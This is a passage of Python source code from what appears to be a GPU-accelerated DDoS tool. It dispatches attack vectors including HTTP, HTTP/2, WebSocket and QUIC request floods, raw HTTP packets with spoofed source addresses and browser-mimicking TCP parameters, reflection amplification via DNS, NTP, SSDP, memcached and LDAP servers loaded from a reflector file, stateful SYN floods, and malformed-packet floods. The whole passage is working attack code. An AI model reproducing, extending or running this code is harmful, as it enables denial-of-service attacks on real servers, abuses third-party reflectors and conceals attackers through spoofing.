                            batch_count, args['http_concurrency'],
                            workflow_steps=None,
                            verbose=args['verbose'],
                            scheme=args['http_scheme'],
                            verify=verify_ssl,
                            timeout_s=args['http_timeout'],
                            ssl_context=ssl_context,
                            user_agent=args.get('user_agent'),
                            retries=args.get('http_retries', 0),
                            http_method=args.get('http_method', 'GET'),
                            http_path=args.get('http_path', ['/']),
                            payloads=args.get('payloads', []),
                            session_repeats=args.get('l7_session_repeats', 1),
                            max_active_sessions=args.get('l7_max_active_sessions', 0),
                            l7_engine=args.get('l7_engine', 'python'),
                            legacy_path_enable=bool(args.get('legacy_path_enable', False)),
                            lab_profile=args.get('lab_profile', 'off'),
                            l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                            l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                            request_plan=request_plan,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress,
                        ))
                    return
                payload_engine = gpu_payload.GPUPayloadEngine(
                    BATCH_SIZE,
                    rng_seed=args.get("gpu_rng_seed", 1234),
                )
                custom_methods = [str(args.get("http_method", "GET") or "GET").upper()]
                custom_paths = args.get("http_path")
                custom_uas = [str(args.get("user_agent"))] if args.get("user_agent") else None
                payload_engine.load_custom_wordlists(
                    methods=custom_methods,
                    paths=custom_paths if isinstance(custom_paths, list) and custom_paths else ["/"],
                    uas=custom_uas,
                )

                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    payload_engine.count = batch_count
                    request_plan = payload_engine.generate_h2_request_plan(
                        target_ip=args['target'],
                        count=batch_count,
                        current_time=int(time.time() * 1000),
                    )
                    worker_stats = _add_stats(worker_stats, await senders.http_stateful_sender(
                        args['target'], args['port'],
                        batch_count, args['http_concurrency'],
                        workflow_steps=None,
                        verbose=args['verbose'],
                        scheme=args['http_scheme'],
                        verify=verify_ssl,
                        timeout_s=args['http_timeout'],
                        ssl_context=ssl_context,
                        user_agent=args.get('user_agent'),
                        retries=args.get('http_retries', 0),
                        http_method=args.get('http_method', 'GET'),
                        http_path=args.get('http_path', ['/']),
                        payloads=args.get('payloads', []),
                        session_repeats=args.get('l7_session_repeats', 1),
                        max_active_sessions=args.get('l7_max_active_sessions', 0),
                        l7_engine=args.get('l7_engine', 'python'),
                        legacy_path_enable=bool(args.get('legacy_path_enable', False)),
                        lab_profile=args.get('lab_profile', 'off'),
                        l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                        l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                        request_plan=request_plan,
                        live_sent=sent_total,
                        live_errors=errors_total,
                        live_progress=progress,
                    ))
                    remaining -= batch_count
                    await asyncio.sleep(0)
                return

            # --- NEW: GPU Payload Engine for HTTP ---
            if args['attack_vector'] == 'http':
                log_info("Initializing GPU Payload Engine (Polymorphic HTTP)...")

                # Fragmentation on the GPU path is not supported in this build.
                # Keep CPU/Scapy fragmentation (see ddos_samurai.senders.packet_sender).
                if args.get('fragment', False):
                    log_warning("GPU backend için --fragment şu an desteklenmiyor; görmezden geliniyor.")

                # P2 FIX #19: Resolve Gateway MAC
                gw_mac_str = get_gateway_mac(args['target'])
                gw_mac_int = mac_to_int(gw_mac_str)

                # --- NEW: TCP Mimicry Synchronization ---
                profile_name = args.get("tls_profile", args.get("ja3_profile", "chrome_120"))
                tcp_params = stealth.get_tcp_params(profile_name)

                win_val = tcp_params['window']
                mss_val = tcp_params['mss']
                ttl_val = tcp_params['ttl']

                stream_ring = _build_stream_ring()
                stream_idx = 0
                ready_queue = []

                BATCH_SIZE = int(_gpu_batch_size)
                remaining = args['count']
                payload_engine = gpu_payload.GPUPayloadEngine(
                    BATCH_SIZE,
                    rng_seed=args.get("gpu_rng_seed", 1234),
                )

                # Load custom wordlists once per worker/engine.
                if args.get('http_path') and isinstance(args['http_path'], list):
                    payload_engine.load_custom_wordlists(paths=args['http_path'])

                window_sizes_full = cp.empty(BATCH_SIZE, dtype=cp.uint16)
                window_sizes_full.fill(win_val)
                mss_values_full = cp.empty(BATCH_SIZE, dtype=cp.uint16)
                mss_values_full.fill(mss_val)
                ttls_full = cp.empty(BATCH_SIZE, dtype=cp.uint8)
                ttls_full.fill(ttl_val)

                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    payload_engine.count = batch_count
                    window_sizes = window_sizes_full[:batch_count]
                    mss_values = mss_values_full[:batch_count]
                    ttls = ttls_full[:batch_count]

                    packets_gpu_array, packet_size = payload_engine.generate_fused_http(
                        target_ip=args['target'],
                        target_port=args['port'],
                        real_src_ip=real_src_ip,
                        spoof_ip=args['spoof'],
                        stream=stream_ring[stream_idx],
                        slot=stream_idx,
                        gateway_mac=gw_mac_int,
                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
                        current_time=int(time.time() * 1000),
                        window_sizes=window_sizes,
                        mss_values=mss_values,
                        ttls=ttls
                    )
                    packet_size_int = int(packet_size)
                    lengths_gpu = payload_engine.packet_lengths[:batch_count]
                    valid_mask = lengths_gpu > 0
                    valid_count = int(cp.count_nonzero(valid_mask))
                    if valid_count <= 0:
                        remaining -= batch_count
                        await asyncio.sleep(0)
                        continue

                    active_rows = packets_gpu_array[: batch_count * packet_size_int].reshape(batch_count, packet_size_int)
                    if valid_count < batch_count:
                        compact_rows = active_rows[valid_mask]
                        if hasattr(cp, "ascontiguousarray"):
                            active_gpu = cp.ascontiguousarray(compact_rows).reshape(-1)
                        else:
                            active_gpu = compact_rows.reshape(-1)
                    else:
                        active_gpu = active_rows.reshape(-1)

                    current_batch = {
                        "cpu": _gpu_to_host(
                            active_gpu,
                            f"http_fused_slot{stream_idx}",
                            stream=stream_ring[stream_idx],
                            blocking=False,
                        ),
                        "count": valid_count,
                        "packet_size": packet_size_int,
                        "stream": stream_ring[stream_idx],
                        "slot": stream_idx,
                        "ready_event": _make_ready_event(stream_ring[stream_idx]),
                    }
                    ready_queue.append(current_batch)
                    stream_idx = (stream_idx + 1) % len(stream_ring)
                    remaining -= batch_count

                    while len(ready_queue) >= _gpu_pipeline_depth:
                        send_batch = ready_queue.pop(0)
                        _evt = send_batch.get("ready_event")
                        if _evt is not None:
                            await _await_cuda_event(_evt)
                        send_buf = send_batch["cpu"]
                        send_count = int(send_batch["count"])
                        if send_count <= 0:
                            continue
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=send_buf,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=send_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))

                    await asyncio.sleep(0)

                while ready_queue:
                    send_batch = ready_queue.pop(0)
                    _evt = send_batch.get("ready_event")
                    if _evt is not None:
                        await _await_cuda_event(_evt)
                    send_buf = send_batch["cpu"]
                    send_count = int(send_batch["count"])
                    if send_count <= 0:
                        continue
                    worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                        packets_buffer=send_buf,
                        target_ip=args['target'],
                        target_port=args['port'],
                        count=send_count,
                        verbose=args['verbose'],
                        pacing_config=pacing_cfg,
                        live_sent=sent_total,
                        live_errors=errors_total,
                        live_progress=progress
                    ))
                return

            if args['attack_vector'] == 'http2':
                log_info("Initializing GPU HTTP/2 planner (hybrid GPU plan + CPU transport)...")
                verify_ssl = (str(args.get('http_verify', 'true')).lower() != "false")
                BATCH_SIZE = int(_gpu_batch_size)
                remaining = int(args['count'])
                if traffic_model_request_plans:
                    for request_plan in traffic_model_request_plans:
                        plan_count = int(len(request_plan.items))
                        worker_stats = _add_stats(worker_stats, await senders.http2_sender(
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=plan_count,
                            concurrency=args['http2_concurrency'],
                            http_path=args['http_path'],
                            http_method=args['http_method'],
                            verbose=args['verbose'],
                            scheme=args['http_scheme'],
                            cookies=args.get('cookies'),
                            user_agent=args.get('user_agent'),
                            ssl_context=ssl_context,
                            verify=verify_ssl,
                            h2_profile_name=args.get("h2_profile", args.get("ja3_profile", "none")),
                            l7_http2_engine=args.get("l7_http2_engine", "auto"),
                            l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                            l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                            lab_profile=args.get("lab_profile", "off"),
                            request_plan=request_plan,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress,
                        ))
                    return
                payload_engine = gpu_payload.GPUPayloadEngine(
                    BATCH_SIZE,
                    rng_seed=args.get("gpu_rng_seed", 1234),
                )

                custom_methods = [str(args.get("http_method", "GET") or "GET").upper()]
                custom_paths = args.get("http_path")
                custom_uas = None
                if args.get("user_agent"):
                    custom_uas = [str(args["user_agent"])]
                payload_engine.load_custom_wordlists(
                    methods=custom_methods,
                    paths=custom_paths if isinstance(custom_paths, list) and custom_paths else ["/"],
                    uas=custom_uas,
                )

                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    payload_engine.count = batch_count
                    request_plan = payload_engine.generate_h2_request_plan(
                        target_ip=args['target'],
                        count=batch_count,
                        current_time=int(time.time() * 1000),
                    )
                    plan_count = len(request_plan.items)
                    if plan_count > 0:
                        worker_stats = _add_stats(worker_stats, await senders.http2_sender(
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=plan_count,
                            concurrency=args['http2_concurrency'],
                            http_path=args['http_path'],
                            http_method=args['http_method'],
                            verbose=args['verbose'],
                            scheme=args['http_scheme'],
                            cookies=args.get('cookies'),
                            user_agent=args.get('user_agent'),
                            ssl_context=ssl_context,
                            verify=verify_ssl,
                            h2_profile_name=args.get("h2_profile", args.get("ja3_profile", "none")),
                            l7_http2_engine=args.get("l7_http2_engine", "auto"),
                            l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                            l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                            lab_profile=args.get("lab_profile", "off"),
                            request_plan=request_plan,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress,
                        ))
                    remaining -= batch_count
                    await asyncio.sleep(0)
                return

            if args['attack_vector'] == 'websocket':
                if bool(args.get("ws_scenario", False)):
                    log_info("Initializing GPU L7 planner + CPU WebSocket scenario engine...")
                    BATCH_SIZE = int(_gpu_batch_size)
                    remaining = int(args['count'])
                    if traffic_model_request_plans:
                        for request_plan in traffic_model_request_plans:
                            batch_count = int(len(request_plan.items))
                            worker_stats = _add_stats(worker_stats, await senders.websocket_scenario_sender(
                                target_ip=args['target'],
                                target_port=args['port'],
                                count=batch_count,
                                concurrency=args['ws_concurrency'],
                                ws_path=args['ws_path'],
                                verbose=args['verbose'],
                                auth_message=args.get("ws_auth_message", ""),
                                subscribe_messages=args.get("ws_subscribe_message"),
                                ping_message=args.get("ws_message", "ping"),
                                ping_count=args.get("ws_ping_count", 1),
                                await_response=bool(args.get("ws_await_response", False)),
                                l7_engine=args.get('l7_engine', 'python'),
                                legacy_path_enable=bool(args.get('legacy_path_enable', False)),
                                lab_profile=args.get('lab_profile', 'off'),
                                l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                                l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                                request_plan=request_plan,
                                ssl_context=ssl_context,
                                live_sent=sent_total,
                                live_errors=errors_total,
                                live_progress=progress,
                            ))
                        return
                    payload_engine = gpu_payload.GPUPayloadEngine(
                        BATCH_SIZE,
                        rng_seed=args.get("gpu_rng_seed", 1234),
                    )
                    ws_paths = [str(args.get("ws_path", "/") or "/")]
                    payload_engine.load_custom_wordlists(
                        methods=["GET"],
                        paths=ws_paths,
                        uas=[str(args.get("user_agent"))] if args.get("user_agent") else None,
                    )
                    while remaining > 0:
                        batch_count = min(remaining, BATCH_SIZE)
                        payload_engine.count = batch_count
                        request_plan = payload_engine.generate_h2_request_plan(
                            target_ip=args['target'],
                            count=batch_count,
                            current_time=int(time.time() * 1000),
                        )
                        worker_stats = _add_stats(worker_stats, await senders.websocket_scenario_sender(
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=batch_count,
                            concurrency=args['ws_concurrency'],
                            ws_path=args['ws_path'],
                            verbose=args['verbose'],
                            auth_message=args.get("ws_auth_message", ""),
                            subscribe_messages=args.get("ws_subscribe_message"),
                            ping_message=args.get("ws_message", "ping"),
                            ping_count=args.get("ws_ping_count", 1),
                            await_response=bool(args.get("ws_await_response", False)),
                            l7_engine=args.get('l7_engine', 'python'),
                            legacy_path_enable=bool(args.get('legacy_path_enable', False)),
                            lab_profile=args.get('lab_profile', 'off'),
                            l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                            l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                            request_plan=request_plan,
                            ssl_context=ssl_context,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress,
                        ))
                        remaining -= batch_count
                        await asyncio.sleep(0)
                    return
                worker_stats = _add_stats(worker_stats, await senders.websocket_sender(
                    target_ip=args['target'],
                    target_port=args['port'],
                    count=args['count'],
                    concurrency=args['ws_concurrency'],
                    ws_path=args['ws_path'],
                    ws_message=args['ws_message'],
                    verbose=args['verbose'],
                    ssl_context=ssl_context,
                    live_sent=sent_total,
                    live_errors=errors_total,
                    live_progress=progress,
                ))
                return

            if args['attack_vector'] == 'quic':
                log_info("Initializing GPU L7 planner + CPU QUIC engine...")
                BATCH_SIZE = int(_gpu_batch_size)
                remaining = int(args['count'])
                if traffic_model_request_plans:
                    for request_plan in traffic_model_request_plans:
                        batch_count = int(len(request_plan.items))
                        worker_stats = _add_stats(worker_stats, await senders.quic_sender(
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=batch_count,
                            concurrency=args['quic_concurrency'],
                            quic_path=args['quic_path'],
                            quic_method=args['quic_method'],
                            verbose=args['verbose'],
                            ssl_context=ssl_context,
                            l7_quic_engine=args.get("l7_quic_engine", "auto"),
                            l7_quic_require_native=bool(args.get("l7_quic_require_native", False)),
                            l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                            l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                            lab_profile=args.get("lab_profile", "off"),
                            quic_streams_per_conn=int(args.get("quic_streams_per_conn", 0) or 0),
                            quic_requests_per_conn=int(args.get("quic_requests_per_conn", 0) or 0),
                            quic_conn_pool_size=int(args.get("quic_conn_pool_size", 1) or 1),
                            quic_expect_status_min=int(args.get("quic_expect_status_min", 200) or 200),
                            quic_expect_status_max=int(args.get("quic_expect_status_max", 399) or 399),
                            quic_require_response_headers=bool(args.get("quic_require_response_headers", True)),
                            quic_require_response_body=bool(args.get("quic_require_response_body", False)),
                            quic_min_response_body_bytes=int(args.get("quic_min_response_body_bytes", 0) or 0),
                            quic_expect_header_name=str(args.get("quic_expect_header_name", "") or ""),
                            quic_expect_header_value_contains=str(args.get("quic_expect_header_value_contains", "") or ""),
                            quic_expect_body_substring=str(args.get("quic_expect_body_substring", "") or ""),
                            request_plan=request_plan,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress,
                        ))
                    return
                payload_engine = gpu_payload.GPUPayloadEngine(
                    BATCH_SIZE,
                    rng_seed=args.get("gpu_rng_seed", 1234),
                )
                payload_engine.load_custom_wordlists(
                    methods=[str(args.get("quic_method", "GET") or "GET").upper()],
                    paths=[str(args.get("quic_path", "/") or "/")],
                    uas=[str(args.get("user_agent"))] if args.get("user_agent") else None,
                )
                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    payload_engine.count = batch_count
                    request_plan = payload_engine.generate_h2_request_plan(
                        target_ip=args['target'],
                        count=batch_count,
                        current_time=int(time.time() * 1000),
                    )
                    worker_stats = _add_stats(worker_stats, await senders.quic_sender(
                        target_ip=args['target'],
                        target_port=args['port'],
                        count=batch_count,
                        concurrency=args['quic_concurrency'],
                        quic_path=args['quic_path'],
                        quic_method=args['quic_method'],
                        verbose=args['verbose'],
                        ssl_context=ssl_context,
                        l7_quic_engine=args.get("l7_quic_engine", "auto"),
                        l7_quic_require_native=bool(args.get("l7_quic_require_native", False)),
                        l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                        l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                        lab_profile=args.get("lab_profile", "off"),
                        quic_streams_per_conn=int(args.get("quic_streams_per_conn", 0) or 0),
                        quic_requests_per_conn=int(args.get("quic_requests_per_conn", 0) or 0),
                        quic_conn_pool_size=int(args.get("quic_conn_pool_size", 1) or 1),
                        quic_expect_status_min=int(args.get("quic_expect_status_min", 200) or 200),
                        quic_expect_status_max=int(args.get("quic_expect_status_max", 399) or 399),
                        quic_require_response_headers=bool(args.get("quic_require_response_headers", True)),
                        quic_require_response_body=bool(args.get("quic_require_response_body", False)),
                        quic_min_response_body_bytes=int(args.get("quic_min_response_body_bytes", 0) or 0),
                        quic_expect_header_name=str(args.get("quic_expect_header_name", "") or ""),
                        quic_expect_header_value_contains=str(args.get("quic_expect_header_value_contains", "") or ""),
                        quic_expect_body_substring=str(args.get("quic_expect_body_substring", "") or ""),
                        request_plan=request_plan,
                        live_sent=sent_total,
                        live_errors=errors_total,
                        live_progress=progress,
                    ))
                    remaining -= batch_count
                    await asyncio.sleep(0)
                return

            # --- AMPLIFICATION MODE (GPU) ---
            if args['attack_vector'] in ["ntp-amp", "ssdp-amp", "dns-amp", "memcached-amp", "ldap-amp"]:
                log_info(f"Initializing GPU Amplification Attack ({args['attack_vector']})...")
                
                # 1. Load Reflectors
                reflector_file = args.get('reflector_file')
                if not reflector_file:
                    log_error("Reflector file is required for amplification attacks!")
                    return

                reflectors = []
                try:
                    with open(reflector_file, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                reflectors.append(line)
                except Exception as e:
                    log_error(f"Failed to load reflectors: {e}")
                    return
                
                if not reflectors:
                    log_error("No reflectors found in file!")
                    return
                
                log_info(f"Loaded {len(reflectors)} reflectors.")
                
                # Keep only valid reflector IPs
                valid_reflectors = []
                for ip in reflectors:
                    try:
                        _ = int(sum([int(x) << (24 - i*8) for i, x in enumerate(ip.split('.'))]))
                        valid_reflectors.append(ip)
                    except:
                        pass
                
                if not valid_reflectors:
                    log_error("No valid reflector IPs found!")
                    return

                # 2. Create Template (CPU)
                dummy_reflector = valid_reflectors[0]
                victim_ip = args['target']
                
                if args['attack_vector'] == "dns-amp":
                    pkt = packet.create_dns_amp_packet(dummy_reflector, victim_ip, args['dns_name'])
                elif args['attack_vector'] == "ntp-amp":
                    pkt = packet.create_ntp_amp_packet(dummy_reflector, victim_ip)
                elif args['attack_vector'] == "ssdp-amp":
                    pkt = packet.create_ssdp_amp_packet(dummy_reflector, victim_ip)
                elif args['attack_vector'] == "memcached-amp":
                    pkt = packet.create_memcached_amp_packet(dummy_reflector, victim_ip)
                elif args['attack_vector'] == "ldap-amp":
                    pkt = packet.create_ldap_amp_packet(dummy_reflector, victim_ip)
                else:
                    pkt = packet.create_dns_amp_packet(dummy_reflector, victim_ip) # Fallback
                
                # Add Ethernet Header (Required for TX_RING)
                full_bytes = bytes(pkt)
                has_ether_in_bytes = (len(full_bytes) >= 34 and (full_bytes[14] & 0xF0) == 0x40)
                
                if not has_ether_in_bytes:
                    try:
                        iface, gw_mac_bytes = senders.get_gateway_info(victim_ip)
                        if not gw_mac_bytes:
                            dst_mac_bytes = b'\xff\xff\xff\xff\xff\xff'
                            iface = "eth0"
                        else:
                            dst_mac_bytes = gw_mac_bytes

                        from scapy.all import get_if_hwaddr
                        try:
                            src_mac_str = get_if_hwaddr(iface)
                            clean_src_mac = src_mac_str.strip().replace(':', '').replace('-', '').replace(' ', '')
                            src_mac_bytes = bytes.fromhex(clean_src_mac)
                        except:
                            src_mac_bytes = b'\x00\x00\x00\x00\x00\x00'
                            
                        eth_type = b'\x08\x00'
                        t_bytes = dst_mac_bytes + src_mac_bytes + eth_type + full_bytes
                    except Exception as e:
                        t_bytes = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00' + full_bytes
                else:
                    t_bytes = full_bytes

                try:
                    gw_mac_int = mac_to_int(get_gateway_mac(victim_ip))
                except Exception:
                    gw_mac_int = 0xFFFFFFFFFFFF
                stream_ring = _build_stream_ring()
                stream_idx = 0
                ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
                BATCH_SIZE = int(_gpu_batch_size)
                remaining = args['count']

                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    packets_gpu_array, packet_size = gpu_packet.generate_amplification_packets(
                        template_bytes=t_bytes,
                        reflectors_ips=valid_reflectors,
                        victim_ip=victim_ip,
                        count=batch_count,
                        has_ethernet=True,
                        stream=stream_ring[stream_idx],
                        gateway_mac=gw_mac_int,
                        return_host_ready=True,
                    )
                    current_batch = {
                        "cpu": _gpu_to_host(
                            packets_gpu_array,
                            f"amp_slot{stream_idx}",
                            stream=stream_ring[stream_idx],
                            blocking=False,
                        ),
                        "count": batch_count,
                        "packet_size": int(packet_size),
                        "stream": stream_ring[stream_idx],
                        "slot": stream_idx,
                        "ready_event": _make_ready_event(stream_ring[stream_idx]),
                    }
                    if ring_q.full():
                        await _consume_one_ring_batch(ring_q, 0, ingest_state=True)
                    await _enqueue_with_backpressure(ring_q, current_batch)
                    stream_idx = (stream_idx + 1) % len(stream_ring)
                    remaining -= batch_count

                    await _drain_ring_to_depth(
                        ring_q,
                        0,
                        keep_depth=_gpu_pipeline_depth - 1,
                        ingest_state=True,
                    )

                    await asyncio.sleep(0)

                while not ring_q.empty():
                    await _consume_one_ring_batch(ring_q, 0, ingest_state=True)
                return

            # --- STATEFUL TCP MODE ---
            if args.get('stateful', False):
                log_info("Initializing Stateful TCP Engine (Viper-State)...")
                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
                    log_error("Stateful mode requires fast_sender C extension.")
                    return
                
                # 1. Start RX Handler (C Extension)
                iface, gw_mac_bytes = senders.get_gateway_info(args['target'])
                
                # Handle None case gracefully
                if not gw_mac_bytes:
                    log_warning("Gateway MAC resolve edilemedi, broadcast MAC kullanılıyor...")
                    gw_mac_bytes = b'\xff\xff\xff\xff\xff\xff'
                    if not iface:
                        iface = "eth0"  # Fallback interface
                
                senders.fast_sender.start_rx_handler(iface)
                
                # 2. Prepare Templates (Ensure consistent size)
                template_pool = []
                max_t_size = 0
                raw_templates = []
                
                stateful_pool_size = max(1, int(args.get("gpu_template_pool_size_l4", 10) or 10))
                for _ in range(stateful_pool_size):
                    pkt_config = packet.PacketConfig(
                        target_ip=args['target'], 
                        target_port=args['port'],
                        protocol='tcp',
                        spoof=False,
                        tcp_flags='S',
                        attack_vector='basic'
                    )
                    template_pkt = packet.create_packet(pkt_config)
                    t_bytes = bytes(template_pkt)
                    
                    # Robust Ethernet Check: Check first nibble for IP version 4
                    # If it's 0x45, it's likely an IP packet without Ethernet
                    if (t_bytes[0] & 0xF0) == 0x40:
                        t_bytes = gw_mac_bytes + b'\x00'*6 + b'\x08\x00' + t_bytes
                    
                    raw_templates.append(t_bytes)
                    if len(t_bytes) > max_t_size:
                        max_t_size = len(t_bytes)
                
                # Pad all templates to max_t_size
                actual_lengths = []
                for t in raw_templates:
                    actual_lengths.append(len(t))
                    if len(t) < max_t_size:
                        t += b'\x00' * (max_t_size - len(t))
                    template_pool.append(t)

                # 3. Main Loop (one-batch-ahead pipeline)
                stream_ring = _build_stream_ring()
                stream_idx = 0
                gw_mac_int = utils.mac_to_int(utils.get_gateway_mac(args['target']))
                
                # Get actual local IP for state lookup
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect((args['target'], 80))
                    local_ip = s.getsockname()[0]
                except Exception:
                    local_ip = real_src_ip
                finally:
                    s.close()
                local_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(local_ip.split('.'))]))
                log_info(f"Using local IP {local_ip} for state tracking.")

                start_time = time.time()
                
                # Partition source ports by worker_id to avoid state table collisions
                # Total available ports: 65535 - 1024 = 64511
                # Each worker gets a slice of the port range
                num_workers = args.get('workers', 1)
                ports_per_worker = 64511 // num_workers
                start_port = 1024 + (worker_id * ports_per_worker)
                
                ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
                while True:
                    # Poll State Table in BATCH (C Extension)
                    # We use local_ip_int for lookup and the worker's specific start_port
                    seq_list, ack_list, state_list, win_list, mss_list, ttl_list = senders.fast_sender.get_states_batch(
                        local_ip_int, start_port, args['count']
                    )

                    # Generate next batch first so GPU can run while previous batch is sent.
                    packets_gpu_array, packet_size = gpu_packet.generate_stateful_packets(
                        templates_bytes_list=template_pool,
                        count=args['count'],
                        target_ip=args['target'],
                        spoof_ip=args['spoof'],
                        real_src_ip=local_ip,
                        has_ethernet=True,
                        stream=stream_ring[stream_idx],
                        gateway_mac=gw_mac_int,
                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
                        seq_list=seq_list,
                        ack_list=ack_list,
                        state_list=state_list,
                        actual_lengths=actual_lengths,
                        specific_src_port=start_port,
                        window_sizes=win_list,
                        mss_values=mss_list,
                        ttls=ttl_list,
                        return_host_ready=True,
                    )
                    current_batch = {
                        "cpu": _gpu_to_host(
                            packets_gpu_array,
                            f"stateful_slot{stream_idx}",
                            stream=stream_ring[stream_idx],
                            blocking=False,
                        ),
                        "count": args['count'],
                        "packet_size": int(packet_size),
                        "stream": stream_ring[stream_idx],
                        "slot": stream_idx,
                        "ready_event": _make_ready_event(stream_ring[stream_idx]),
                    }
                    if ring_q.full():
                        await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
                    await _enqueue_with_backpressure(ring_q, current_batch)
                    stream_idx = (stream_idx + 1) % len(stream_ring)

                    await _drain_ring_to_depth(
                        ring_q,
                        args['port'],
                        keep_depth=_gpu_pipeline_depth - 1,
                        ingest_state=True,
                    )

                    # In stateful mode, we need to loop to allow handshakes to complete.
                    if args['count'] > 0 and time.time() - start_time > 5:
                        break

                    await asyncio.sleep(0.1)

                while not ring_q.empty():
                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
                _update_state_engine_stats()
                return

            # --- ANOMALY MODE (GPU) ---
            if args['attack_vector'] == 'anomaly':
                from . import anomaly_packet
                log_info("Initializing GPU Anomaly Packet Engine...")
                
                gw_mac_str = get_gateway_mac(args['target'])
                gw_mac_int = mac_to_int(gw_mac_str)
                stream = numba_cuda.stream()
                
                anomaly_types = args.get('anomaly_types', None)
                anomaly_intensity = args.get('anomaly_intensity', 75)
                use_suite = args.get('anomaly_suite', False)
                
                if use_suite:
                    # Full suite: standard + overlapping frags + tiny frags
                    log_info("Using Full Anomaly Suite (standard + overlap + tiny)")
                    results = anomaly_packet.generate_full_anomaly_suite(
                        count=args['count'],
                        target_ip=args['target'],
                        target_port=args['port'],
                        real_src_ip=real_src_ip,
                        spoof_ip=args['spoof'],
                        has_ethernet=True,
                        anomaly_intensity=anomaly_intensity,
                        stream=stream,
                        gateway_mac=gw_mac_int,
                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                    )
                    stream.synchronize()
                    
                    for key, (buf, pkt_size) in results.items():
                        cpu_buf = _gpu_to_host(buf, f"anomaly_suite_{key}")
                        pkt_count = len(cpu_buf) // pkt_size
                        log_info(f"Sending {pkt_count} {key} packets (size={pkt_size})...")
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=cpu_buf,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=pkt_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))
                else:
                    # Check if fragment-type anomalies are requested
                    has_overlap = anomaly_types and 6 in anomaly_types
                    has_tiny = anomaly_types and 7 in anomaly_types
                    
                    # Filter out fragment types from standard kernel
                    std_types = anomaly_types
                    if std_types:
                        std_types = [t for t in std_types if t not in (6, 7)]
                    
                    # Standard anomaly packets
                    if std_types is None or len(std_types) > 0:
                        stream_ring_std = _build_stream_ring()
                        std_idx = 0
                        std_ready_queue = []
                        std_remaining = args['count']
                        std_batch_size = int(_gpu_batch_size)

                        while std_remaining > 0:
                            std_count = min(std_remaining, std_batch_size)
                            packets_gpu, pkt_size = anomaly_packet.generate_anomaly_packets(
                                count=std_count,
                                target_ip=args['target'],
                                target_port=args['port'],
                                anomaly_types=std_types if std_types else None,
                                real_src_ip=real_src_ip,
                                spoof_ip=args['spoof'],
                                has_ethernet=True,
                                anomaly_intensity=anomaly_intensity,
                                stream=stream_ring_std[std_idx],
                                gateway_mac=gw_mac_int,
                                spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                            )
                            std_current = {
                                "cpu": _gpu_to_host(
                                    packets_gpu,
                                    f"anomaly_std_slot{std_idx}",
                                    stream=stream_ring_std[std_idx],
                                    blocking=False,
                                ),
                                "count": std_count,
                                "stream": stream_ring_std[std_idx],
                                "slot": std_idx,
                                "ready_event": _make_ready_event(stream_ring_std[std_idx]),
                            }
                            std_ready_queue.append(std_current)
                            std_idx = (std_idx + 1) % len(stream_ring_std)
                            std_remaining -= std_count

                            while len(std_ready_queue) >= _gpu_pipeline_depth:
                                std_send = std_ready_queue.pop(0)
                                _evt = std_send.get("ready_event")
                                if _evt is not None:
                                    await _await_cuda_event(_evt)
                                worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                                    packets_buffer=std_send["cpu"],
                                    target_ip=args['target'],
                                    target_port=args['port'],
                                    count=std_send["count"],
                                    verbose=args['verbose'],
                                    pacing_config=pacing_cfg,
                                    live_sent=sent_total,
                                    live_errors=errors_total,
                                    live_progress=progress
                                ))

                            await asyncio.sleep(0)

                        while std_ready_queue:
                            std_send = std_ready_queue.pop(0)
                            _evt = std_send.get("ready_event")
                            if _evt is not None:
                                await _await_cuda_event(_evt)
